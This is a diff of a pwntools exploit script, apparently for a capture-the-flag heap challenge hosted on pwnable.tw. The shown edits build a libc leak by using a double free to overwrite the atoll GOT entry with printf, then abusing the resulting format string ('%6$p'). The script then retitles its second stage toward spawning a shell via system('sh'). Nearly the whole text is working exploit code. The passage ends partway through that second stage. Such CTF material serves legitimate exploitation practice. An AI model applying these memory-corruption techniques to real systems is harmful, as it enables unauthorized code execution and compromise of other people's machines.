@@ -29,7 +29,7 @@ if args.REMOTE:
     p = remote('chall.pwnable.tw', 10106)
 else:
     p = process([exe.path])
-# GDB()
+GDB()
 
 def alloc(idx, size, data):
     slna(b'choice: ', 1)
@@ -57,6 +57,7 @@ def exit():
 ##########################
 ### STAGE 1: Leak libc ###
 ##########################
+# Double Free
 alloc(0, 0x18, b'A'*4)
 realloc(0, 0, b'')
 realloc(0, 0x18, p64(exe.got['atoll']))
@@ -78,19 +79,20 @@ rfree(1)
 realloc(0, 0x50, b'A'*8)
 rfree(0)
 
+# Format String
 alloc(0, 0x38, p64(exe.plt['printf']))
-slna(b'choice: ', 3)
-sla(b'Index:', b'%7$p')
-GDB()
+slna(b'choice: ', 1)
+sla(b'Index:', b'%6$p')
+
 libc_leak = int(p.recvline().strip(), 16)
 libc.address = libc_leak - 0x1e5760
 info("Libc leak: " + hex(libc_leak)) 
 info("Libc base: " + hex(libc.address))
 
-########################
-### STAGE 2: Oneshot ###
-########################
-oneshot = [0xe21d1, 0xe22ee, 0xe2383, 0xe2386, 0x106ef8]
+##########################
+### STAGE 2: Get shell ###
+##########################
+# System('sh')
 slna(b'choice: ', 1)
 sla(b'Index:', b'')
 slna(b'Size:', b'asdfasdf')
